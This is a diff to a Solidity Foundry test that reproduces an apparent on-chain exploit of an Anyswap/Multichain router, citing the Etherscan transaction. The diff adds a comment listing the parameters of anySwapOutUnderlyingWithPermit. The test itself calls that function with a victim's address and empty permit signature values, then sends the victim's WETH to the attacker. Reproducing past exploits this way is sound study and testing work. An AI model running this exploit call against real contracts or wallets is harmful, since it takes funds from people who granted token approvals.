@@ -17,6 +17,17 @@ contract ContractTest is DSTest {
 
     function testExample() public {
        //https://etherscan.io/tx/0xe50ed602bd916fc304d53c4fed236698b71691a95774ff0aeeb74b699c6227f7
+        //    anySwapOutUnderlyingWithPermit(
+        //     address from,
+        //     address token,
+        //     address to,
+        //     uint amount,
+        //     uint deadline,
+        //     uint8 v,
+        //     bytes32 r,
+        //     bytes32 s,
+        //     uint toChainID
+        //   )
       any.anySwapOutUnderlyingWithPermit(0x3Ee505bA316879d246a8fD2b3d7eE63b51B44FAB,address(this),msg.sender,308636644758370382903,100000000000000000000,0,"0x","0x",56);
       emit log_named_uint("Before exploit, WETH balance of attacker:", weth.balanceOf(msg.sender));
       weth.transfer(msg.sender, 308636644758370382901);
